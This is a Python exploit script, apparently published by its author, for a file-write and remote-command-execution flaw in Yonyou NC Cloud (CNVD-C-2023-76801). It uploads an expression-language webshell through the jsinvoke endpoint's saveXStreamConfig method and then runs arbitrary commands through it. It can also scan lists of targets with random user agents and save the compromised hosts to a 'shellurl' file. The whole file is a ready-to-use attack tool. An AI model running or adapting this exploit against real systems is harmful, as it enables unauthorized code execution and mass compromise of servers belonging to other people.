import requests
from fake_useragent import UserAgent
import argparse
import sys
import re
import os

proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'https://127.0.0.1:8080'
}

def write_content(urllist,filename):
    filename = filename + ".txt"
    try:
        with open(filename,'w') as f:
            for i in range(0,len(urllist)):
                f.write(urllist[i]+ "\n")
        f.close

        print('-'*5 + '+'*10 + '-'*5)
        print("数据已存入文件" + os.getcwd() + "\\" + filename)

    except Exception as e:
        print("文件写入错误!! ERROR:" + str(e))

#验证漏洞存在，返回命令执行结果
def poc(targeturl,headers,filename,command):
    try:
        attackurl = targeturl + "/" +filename+ "?error=bsh.Interpreter"
        uploaddata = 'cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("{}").getInputStream())'.format(command)

        respond = requests.post(url = attackurl,headers=headers,data=uploaddata)
        targetstr = re.findall(r"<string>(.*?)</string>", respond.text, flags=re.DOTALL)[0]
        
        if targetstr and command != "whoami":
            print(targetstr)
            return True
        elif targetstr:
            print("\033[32m[+]INFO:{}  --current power:{}\033[0m".format(attackurl,targetstr))
            return True
        else:
            print("\033[31mERROR:执行失败\033[0m")
            return False
        
    except Exception as e:
        print("\033[31m[-]ERROR:{}\033[0m".format(str(e)))

#随机请求头
def random_headers():
    headers = {
        "User-Agent":UserAgent().random,
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded"
        }
    return headers

#上传文件，验证文件存在(验证代码已被注释，简单来说没什么用)
def upload(targeturl,headers,uploaddata,filename):
    try:
        attackurl = targeturl + "/uapjs/jsinvoke/?action=invoke"

        respond = requests.post(url = attackurl,headers=headers,data=uploaddata,timeout=5)
        
        if(respond.status_code==200):
            print("\033[32m[+]INFO:数据包发送成功!!\033[0m")

            # checkurl = targeturl + "/" + filename
            # respond1 = requests.get(url = checkurl,headers=headers,timeout=5)
            # if(respond1.status_code==200):
            #     print("\033[32m[+]INFO:文件访问成功!!\033[0m")
            # else:
            #     print("\033[31m[-]ERROR:文件访问失败!!\033[0m")
            
            return True
        else:
            print("\033[31m[-]ERROR:数据包发送失败!!\033[0m")
            return False


    except Exception as e:
        print("\033[31m[-]ERROR:45{}\033[0m".format(str(e)))

#读取代码文件
def read_file(filenamepath):
    try:
        
        with open(filenamepath,'r',encoding='utf-8') as f:
            payload = f.read()
        f.close

    except Exception as e:
        print("[-]ERROR:" + str(e))

    return payload

#获取输入参数并返回
def get_args():

    parse = argparse.ArgumentParser(description="用友-NC-cloud exp(CNVD-C-2023-76801) by 我只是好色")
    parse.add_argument('-u',type=str,help='Set target url',dest="targeturl")
    parse.add_argument('-r',type=str,help='Set url list file',dest="targeturllist")
    parse.add_argument('-fn',type=str,help='Set upload filename',required="true",dest="filename")
    parse.add_argument('-c',type=str,help='Set execute command',dest="command")

    args = parse.parse_args()

    return args

def main():
    #获取命令行参数
    args = get_args()

    payload = "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}"
    uploaddata = '{{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["{}","webapps/nc_web/{}"]}}'.format(payload,args.filename)
    
    #单个url检测，不执行命令
    if(args.targeturl and args.command == None):
        print("[+]---INFO:开始对" + args.targeturl + "进行测试---")
        flag = upload(args.targeturl,random_headers(),uploaddata,args.filename)
        if flag:
            poc(args.targeturl,random_headers(),args.filename,"whoami")
    
    #执行命令
    if(args.targeturl and args.command):
            poc(args.targeturl,random_headers(),args.filename,args.command)

    #传入url文件，检测多个url,无法执行命令，拿shell
    if(args.targeturllist):
        shellurllist = []
        with open(args.targeturllist,'r') as f:
            for line in f:

                line = line.strip("\n")
                print("[+]---INFO:开始对" + line + "进行测试---")
                upload_status = upload(line,random_headers(),uploaddata,args.filename)

                if upload_status:
                    poc_status = poc(line,random_headers(),args.filename,"whoami")
                    if poc_status:
                        shellurllist.append(line)
        f.close
        write_content(shellurllist,"shellurl")

    #未指定url/url文件
    if(args.targeturl ==None and args.targeturllist == None):
        print("\033[31m[-]ERROR:请指定url，使用-u，指定目标url，或使用-r，指定目标url文件\033[0m")
        sys.exit()

if __name__ == '__main__':
    main()